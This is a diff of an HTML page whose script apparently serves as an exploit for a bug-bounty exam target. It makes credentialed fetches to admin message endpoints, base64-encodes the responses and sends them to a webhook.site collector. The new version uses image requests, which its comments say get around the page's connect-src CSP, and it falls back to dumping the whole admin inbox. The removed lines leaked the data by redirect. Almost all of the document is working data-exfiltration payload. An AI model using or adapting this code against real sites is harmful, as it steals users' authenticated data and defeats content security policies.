@@ -3,14 +3,22 @@
 <body>
     <script>
         const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/admin/stats";
+        const msgId = "69ea47fabee6d6b7c6645a43";
+        const target = `https://api-bugbounty-exam.hashacademy.co/api/admin/messages/${msgId}`;
 
-        // Fetch the data internally, then use location.replace to leak it
         fetch(target, { credentials: "include" })
             .then(r => r.text())
             .then(data => {
-                // We encode the data and attach it as a query string
-                window.location.replace(webh + "?flag=" + btoa(data));
+                // We use an <img> tag to bypass the connect-src CSP
+                // btoa() encodes the JSON so it fits in a URL
+                new Image().src = `${webh}/leak.png?data=${btoa(data)}`;
+            }).catch(e => {
+                // If the specific message 404s, try the general inbox
+                fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/messages", { credentials: "include" })
+                    .then(r => r.text())
+                    .then(allData => {
+                        new Image().src = `${webh}/inbox.png?data=${btoa(allData)}`;
+                    });
             });
     </script>
 </body>
